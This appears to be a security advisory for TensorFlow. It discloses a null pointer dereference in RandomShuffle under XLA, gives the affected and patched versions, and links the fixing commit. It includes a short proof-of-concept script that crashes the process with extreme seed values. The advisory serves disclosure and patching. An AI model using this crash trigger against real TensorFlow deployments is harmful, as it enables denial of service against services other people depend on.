tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.12.0

## Patched versions

2.11.1, 2.12.0

## Description

### Impact

NPE in RandomShuffle with XLA enable

```
import tensorflow as tf

func = tf.raw_ops.RandomShuffle
para = {'value': 1e+20, 'seed': -4294967297, 'seed2': -2147483649}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```
### Patches

We have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1
